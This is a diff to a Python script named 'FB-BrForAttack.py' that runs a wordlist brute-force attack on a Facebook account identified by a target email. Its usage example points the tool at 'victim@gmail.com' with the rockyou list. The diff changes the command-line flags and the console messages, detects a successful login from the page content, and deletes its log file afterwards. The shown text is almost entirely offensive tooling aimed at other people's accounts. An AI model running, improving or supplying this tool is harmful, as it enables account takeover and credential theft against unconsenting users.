@@ -2,11 +2,14 @@
 # -*- coding: utf-8 -*-
 
 #I Love Python(^-^)
-
-##-------- Import Libraries --------##
-import socket,time,os,optparse	    ##
-##----------------------------------##
-
+try:
+ ##----------- Import Libraries -----------##
+ import socket,time,os,optparse,mechanize  ##
+ from sys import stdout as std             ##
+ ##----------------------------------------##
+except:
+	print("[!] The [ mechanize library ] is Missing!\n[*] Please Install it Using this command> [ pip install mechanize ]")
+	exit(1)
 ################## check internet #################
 server = "www.google.com"                         #
 def check():                                      #
@@ -21,48 +24,42 @@ def check():                                      #
 check = check()                                   #
 ###################################################
 
-parse = optparse.OptionParser("""\nUsage:python ./FB-BrForAttack.py -F <Target Email> -W <Wordlist file>
+parse = optparse.OptionParser("""\nUsage: python ./FB-BrForAttack.py -T <Target Email> -W <Wordlist file>
 
 OPTIONS:
-        -F <target email>        ::>   Set target Email
-        -W <word list file>      ::>   Set Wordlist File 
+        -t <target email>        ::>   Set target Email
+        -w <word list file>      ::>   Set Wordlist File 
 
 Example:
-        ./FB-BrForAttack.py -F victim@gmail.com -W /usr/share/wordlists/rockyou.txt
+        ./FB-BrForAttack.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
 """)
-
 def Main():
-   parse.add_option("-F","--victim",dest="taremail",type="string",
+   parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
 			help="target email !")
-   parse.add_option("-W","--wordlist",dest="wlst",type="string",
+   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
 			help="wordlist file !")
    (options,args) = parse.parse_args()
    if options.taremail !=None and options.wlst !=None: 
      user = options.taremail
      passw = options.wlst
-     try:
-	import mechanize
-     except:
-	   print("[!] The [ mechanize lib ] is Not found!\n[*]Please run this command> [ pip install mechanize ]")
-	   exit()
-
      global check
      if check == True:
 	         try:
 		    passwfile = open(passw, "r")
 		 except:
-                        print("\n[> "+passw+" <] File Not Found !\n")
-                        exit()
-		 os.system("clear || cls")
-		 print("\n[*]website>: www.facebook.com ")
-		 time.sleep(1)
-		 print("\n[+]Target Email>: "+str(user))
-		 time.sleep(1.2)
-		 print("\n[@]Wlist>: "+str(passw))
-		 time.sleep(1)
+                        print("\n[!] No Such File: "+passw+"  !!!\n")
+                        exit(1)
+		 os.system("cls || clear")
+		 time.sleep(0.10)
+		 print("\n[*] website>: www.facebook.com ")
+		 time.sleep(0.10)
+		 print("\n[+] Target Email>: "+str(user))
+		 time.sleep(0.10)
+		 print("\n[@] WordList>: "+str(passw))
+		 time.sleep(0.10)
 		 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
-		 time.sleep(1.1)
-		 print("\n[$]Brute Force Attack Start[$]\n")
+		 time.sleep(0.20)
+		 print("\n[$]--- Brute Force Attack Start ---[$]\n")
 		 time.sleep(0.8)
 		 lo = 1
 		 for password in passwfile:
@@ -81,25 +78,33 @@ def Main():
                 		             dos1.seek(0)
                 		             text=dos1.read().decode("UTF-8")
                 		             if(text.find("home_icon",0,len(text))!=-1):
-                   			        print ("\n[*]Found! Password is ==> "+ password)
+                                                print("\n[+]~[{}] Trying Password[ {} ]  ==> Yes :)".format(lo,password.strip()))
+                   			        print ("[*] Found! Password is ==> "+ password)
 						dos1.close()
-						os.system("rm Facebook-Log.txt || del Facebook-Log.txt")
-					        exit()
+						os.system("del Facebook-Log.txt || rm Facebook-Log.txt")
+					        exit(1)
                 		             else:
-                    			          print ('[!]Trying password:[%s--[%s '%(lo,password))
-						  lo +=1
-
+                    			          print('[-]~[{}] Testing password[ {} ] ==> No :('.format(lo,password.strip()))
+                    			          lo +=1
             			          except KeyboardInterrupt:
                                                  print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
 						 dos1.close()
-						 os.system("rm Facebook-Log.txt || del Facebook-Log.txt")
-						 exit()
+						 os.system("del Facebook-Log.txt || rm Facebook-Log.txt")
+						 exit(1)
      elif check == False:
 		    print("\n[!] Please Check Your Internet Connection !!!")
-		    exit(0)
+		    exit(1)
    else:
 	print(parse.usage)
-
+	exit(1)
 if __name__=='__main__':
 	Main()
-
+	
+##############################################################
+##################### 		     #########################
+#####################   END OF TOOL  #########################
+#####################                #########################
+##############################################################
+#This Tool by Oseid Aldary
+#Have a nice day :)
+#GoodBye
